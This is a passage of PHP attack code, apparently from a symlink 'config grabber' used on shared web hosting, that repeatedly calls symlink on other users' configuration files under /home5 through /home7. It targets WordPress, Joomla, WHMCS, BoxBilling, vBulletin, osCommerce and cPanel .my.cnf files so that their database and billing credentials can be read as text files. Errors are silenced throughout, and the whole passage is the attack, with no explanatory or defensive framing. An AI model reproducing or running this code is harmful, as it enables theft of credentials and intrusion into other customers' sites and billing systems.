@symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home6

@symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home6/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 7 

@symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
